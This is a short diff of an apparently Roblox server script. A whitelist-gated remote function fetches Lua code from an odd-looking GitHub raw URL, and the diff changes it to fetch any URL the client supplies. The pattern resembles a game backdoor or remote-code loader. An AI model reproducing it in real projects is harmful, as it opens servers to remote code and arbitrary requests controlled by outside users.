@@ -330,9 +330,9 @@ game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(play
     module:givegui(player)
 end)
 
-game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr)
+game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr, http)
 	if table.find(module.whitelist, plr.UserId) then
-		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/l.lua", true)
+		return game:GetService("HttpService"):GetAsync(http, true)
 	end
 end
 
